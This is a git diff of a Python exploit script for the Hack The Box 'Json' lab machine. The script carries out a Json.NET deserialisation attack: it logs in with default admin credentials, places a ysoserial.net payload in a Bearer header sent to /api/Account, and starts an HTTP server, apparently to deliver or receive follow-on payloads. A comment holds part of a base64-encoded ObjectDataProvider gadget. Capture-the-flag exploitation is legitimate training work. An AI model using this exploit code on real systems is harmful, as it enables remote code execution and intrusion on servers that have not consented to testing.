@@ -4,8 +4,8 @@ import http.server
 import socketserver
 
 parser = argparse.ArgumentParser(description='JSon.Net Deserialisation exploit (Json hackthebox)')
-parser.add_argument("--hostname", default='http://10.10.10.158', type=str,
-                    help="Login url of Json machine ex: http://10.10.10.158/")
+parser.add_argument("--targetIp", default='10.10.10.158', type=str,
+                    help="Login url of Json machine ex: 10.10.10.158")
 parser.add_argument("--payload", default='', type=str,
                     help="Payload generated with ysoserial.net")
 
@@ -22,7 +22,7 @@ def main():
 
         session = requests.session()
 
-        session.post(args.hostname + '/api/token', data={"UserName": "admin", "Password": "admin"})
+        session.post("http://" + args.targetIp + '/api/token', data={"UserName": "admin", "Password": "admin"})
 
         # "ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25Gc"
         # "mFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMz"
@@ -38,7 +38,7 @@ def main():
 
         payload = {"Bearer": args.payload}
 
-        session.get(args.hostname + '/api/Account', headers=payload)
+        session.get("http://" + args.targetIp + '/api/Account', headers=payload)
 
         try:
             httpd.serve_forever()
